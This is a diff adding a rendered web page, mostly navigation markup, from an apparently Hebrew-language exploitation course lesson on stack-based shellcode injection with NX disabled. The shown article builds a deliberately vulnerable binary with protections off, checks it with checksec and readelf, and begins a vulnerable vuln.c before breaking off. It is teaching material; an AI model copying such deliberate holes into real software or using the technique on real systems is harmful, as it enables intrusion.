+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.2 - הזרקה והרצה ללא NX - הרצאה
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-injection-shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הרעיון - injection shellcode והרצתו
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-executable-stack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        התנאי המקדים - מחסנית ניתנת להרצה - executable stack
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-vulnc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הבינארי לדוגמה - vuln.c
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הבעיה הגדולה - מציאת הכתובת של ה-shellcode
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-aslr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שיטה א - כתובת ישירה כש-ASLR כבוי
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="שיטה א - כתובת ישירה כש-ASLR כבוי">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        המלכודת של gdb מול הרצה אמיתית
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nop-nop-sled" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מזחלת NOP - NOP sled
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="מזחלת NOP - NOP sled">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הexploit מלא - שיטת הכתובת הישירה
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-jmp-esp-jmp-rsp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שיטה ב - טרמפולינה עם jmp esp / jmp rsp
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="שיטה ב - טרמפולינה עם jmp esp / jmp rsp">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit-jmp-rsp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הexploit מלא - שיטת ה-jmp rsp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-shellcode-environment-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שיטה ג - shellcode במשתנה סביבה - environment variable
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מלכודות נפוצות וטיפים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סיכום
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.2 - הזרקה והרצה ללא NX - פתרון
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../3.2%20-%20%D7%94%D7%96%D7%A8%D7%A7%D7%94%20%D7%95%D7%94%D7%A8%D7%A6%D7%94%20%D7%9C%D7%9C%D7%90%20NX%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.2 - הזרקה והרצה ללא NX - תרגול
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../3.3%20-%20shellcode%20%D7%9E%D7%95%D7%92%D7%91%D7%9C/3.3%20-%20shellcode%20%D7%9E%D7%95%D7%92%D7%91%D7%9C%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.3   shellcode מוגבל
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../3.4%20-%20shellcode%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/3.4%20-%20shellcode%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3.4   shellcode מתקדם
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../4%20-%20%D7%A2%D7%A7%D7%99%D7%A4%D7%AA%20NX%20%D7%95ROP%20%D7%91%D7%A1%D7%99%D7%A1%D7%99/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7/4.1%20-%20GOT%20%D7%95PLT%20%D7%9C%D7%A2%D7%95%D7%9E%D7%A7%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4   עקיפת NX וROP בסיסי
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../5%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%9E%D7%97%D7%A8%D7%95%D7%96%D7%AA%20%D7%A4%D7%95%D7%A8%D7%9E%D7%98/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5   חולשות מחרוזת פורמט
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.1%20-%20stack%20pivoting/6.1%20-%20stack%20pivoting%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6   ROP מתקדם
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../7%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%94Heap/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7   ניצול הHeap
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../8%20-%20%D7%94%D7%A0%D7%93%D7%A1%D7%94%20%D7%94%D7%A4%D7%95%D7%9B%D7%94%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8   הנדסה הפוכה לניצול
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9   ניצול קרנל ואתגרים מתקדמים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../10%20-%20%D7%9E%D7%A6%D7%99%D7%90%D7%AA%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%90%D7%9E%D7%99%D7%AA%D7%99%D7%95%D7%AA/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10   מציאת חולשות אמיתיות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-GPU/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות GPU
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-injection-shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הרעיון - injection shellcode והרצתו
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-executable-stack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        התנאי המקדים - מחסנית ניתנת להרצה - executable stack
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-vulnc" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הבינארי לדוגמה - vuln.c
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-shellcode" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הבעיה הגדולה - מציאת הכתובת של ה-shellcode
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-aslr" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שיטה א - כתובת ישירה כש-ASLR כבוי
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="שיטה א - כתובת ישירה כש-ASLR כבוי">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        המלכודת של gdb מול הרצה אמיתית
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nop-nop-sled" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מזחלת NOP - NOP sled
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="מזחלת NOP - NOP sled">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הexploit מלא - שיטת הכתובת הישירה
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-jmp-esp-jmp-rsp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שיטה ב - טרמפולינה עם jmp esp / jmp rsp
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="שיטה ב - טרמפולינה עם jmp esp / jmp rsp">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit-jmp-rsp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הexploit מלא - שיטת ה-jmp rsp
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-shellcode-environment-variable" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שיטה ג - shellcode במשתנה סביבה - environment variable
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מלכודות נפוצות וטיפים
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סיכום
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="ניווט" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    דף הבית
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר ו-Low Level
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר חולשות
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99/3.1%20-%20%D7%9B%D7%AA%D7%99%D7%91%D7%AA%20shellcode%20%D7%99%D7%93%D7%A0%D7%99%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    3   Shellcode
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    3.2   הזרקה והרצה ללא NX
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>3.2 - הזרקה והרצה ללא NX - הרצאה</h1>
+
+<p>בפרק הקודם (3.1) כתבנו shellcode ביד: רצף בתים גולמי שכל תפקידו להריץ <code>execve("/bin/sh", 0, 0)</code> ולפתוח לנו מעטפת. בפרק 2 למדנו לקחת שליטה מלאה על מצביע ההוראות בעזרת buffer overflow. עכשיו נחבר את שני החלקים לתקיפה הקלאסית ביותר בהיסטוריה של ה-pwn: מזריקים את ה-shellcode לתוך הbuffer שגלש, ומכוונים את הreturn address בחזרה אליו. זו בדיוק ההתקפה שתוארה במאמר האגדי "Smashing the Stack for Fun and Profit" מ-1996.</p>
+<p>היופי בתקיפה הזו הוא שאנחנו לא מסתמכים על שום קוד קיים בבינארי - אנחנו מביאים את הקוד שלנו. החיסרון הוא שהיא עובדת רק בתנאי אחד קריטי: המחסנית חייבת להיות <strong>ניתנת להרצה</strong>, כלומר NX כבוי. זו בדיוק הסיבה שכל שאר עולם ה-pwn המודרני (ROP, ret2libc) נולד - כדי להתמודד עם עולם שבו התנאי הזה כבר לא מתקיים. אבל כדי להעריך את הפתרונות המתוחכמים, קודם צריך להבין לעומק את ההתקפה המקורית.</p>
+<h2 id="-injection-shellcode">הרעיון - injection shellcode והרצתו<a class="headerlink" href="#-injection-shellcode" title="Permanent link">&para;</a></h2>
+<p>בואו נחבר את התמונה. יש לנו buffer על המחסנית שאפשר לגלוש ממנו, ויש לנו shellcode. הרעיון בשלוש שורות:</p>
+<ol>
+<li>כותבים את ה-shellcode לתוך אזור הזיכרון שאנחנו שולטים בו (הbuffer עצמו, או המרחב שאחרי הreturn address).</li>
+<li>ממשיכים לכתוב עד שדורסים את הreturn address.</li>
+<li>בהreturn address שמים כתובת שמצביעה <strong>בחזרה אל ה-shellcode</strong> שלנו.</li>
+</ol>
+<p>כשהפונקציה הvulnerable מבצעת <code>ret</code>, מצביע ההוראות קופץ אל הבתים שהזרקנו, המעבד מריץ אותם, ואנחנו מקבלים shell. זהו. הנה איך זה נראה במקרה שבו ה-shellcode יושב בתוך הbuffer:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>low addresses (top of the stack)
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>+----------------------------+
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>| shellcode                  |  &lt;-- we injected here, and this is where we want to jump
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>+----------------------------+
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>| padding up to the return address |
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>+----------------------------+
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>| saved rbp                  |
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>+----------------------------+
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>| return address = address of buf |  &lt;-- ret jumps back to the shellcode
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>+----------------------------+
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>high addresses
+</code></pre></div>
+<p>השאלה היחידה שנשארת, וזו כל ההרצאה, היא: <strong>איזו כתובת בדיוק נכתוב בהreturn address?</strong> אנחנו צריכים לדעת איפה ה-shellcode יישב בזיכרון. רוב ההרצאה עוסקת בשלוש דרכים שונות לענות על השאלה הזו.</p>
+<h2 id="-executable-stack">התנאי המקדים - מחסנית ניתנת להרצה - executable stack<a class="headerlink" href="#-executable-stack" title="Permanent link">&para;</a></h2>
+<p>לפני הכול, נוודא שהתקיפה בכלל אפשרית. אם NX פעיל, המחסנית מסומנת <code>rw-</code> (קריאה וכתיבה, בלי הרצה), והמעבד פשוט יסרב להריץ את הבתים שהזרקנו - נקבל <code>SIGSEGV</code> ברגע הקפיצה. כל ההרצאה הזו מניחה NX <strong>כבוי</strong>, כלומר מחסנית עם הרשאת הרצה.</p>
+<p>איך יוצרים בינארי כזה? עם הדגל <code>-z execstack</code> בזמן הקישור:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>gcc<span class="w"> </span>-m32<span class="w"> </span>-z<span class="w"> </span>execstack<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-no-pie<span class="w"> </span>-o<span class="w"> </span>vuln32<span class="w"> </span>vuln.c
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>gcc<span class="w">      </span>-z<span class="w"> </span>execstack<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-no-pie<span class="w"> </span>-o<span class="w"> </span>vuln64<span class="w"> </span>vuln.c
+</code></pre></div>
+<p>ההנחות שלנו לכל ההרצאה, מפורשות: NX כבוי (המחסנית ניתנת להרצה), בלי canary (הoverflow לא נתפסת), הבינארי לא PIE (כתובות הקוד קבועות). את ה-ASLR נכבה בהתחלה, ובהמשך נראה טכניקה שעובדת גם איתו.</p>
+<p>בודקים את מצב ה-NX עם <code>checksec</code>. שימו לב לשורות <code>NX</code> ו-<code>RWX</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$ checksec --file=./vuln64
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Arch:     amd64-64-little
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>RELRO:    Partial RELRO
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Stack:    No canary found
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>NX:       NX disabled
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>PIE:      No PIE
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>RWX:      Has RWX segments
+</code></pre></div>
+<p>השורות <code>NX disabled</code> ו-<code>Has RWX segments</code> הן בדיוק מה שאנחנו רוצים לראות. אפשר גם לבדוק ישירות את דגלי מקטע ה-<code>GNU_STACK</code> בקובץ ELF:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>$<span class="w"> </span>readelf<span class="w"> </span>-l<span class="w"> </span>vuln64<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>GNU_STACK
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>GNU_STACK<span class="w">  </span>0x0<span class="w"> </span>0x0<span class="w"> </span>0x0<span class="w"> </span>0x0<span class="w"> </span>0x0<span class="w"> </span>RWE<span class="w"> </span>0x10
+</code></pre></div>
+<p>הסימן <code>RWE</code> (במקום <code>RW</code>) אומר שהמחסנית ניתנת להרצה - האות <code>E</code> מסמנת Execute. זו הנורה הירוקה שלנו.</p>
+<h2 id="-vulnc">הבינארי לדוגמה - vuln.c<a class="headerlink" href="#-vulnc" title="Permanent link">&para;</a></h2>
+<p>לאורך ההרצאה נעבוד עם הבינארי הvulnerable הבא. הbuffer קטן, וקריאת <code>read</code> שקוראת הרבה יותר בתים ממה שנכנס בו:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">// vuln.c</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="kt">void</span><span class="w"> </span><span class="nf">vuln</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
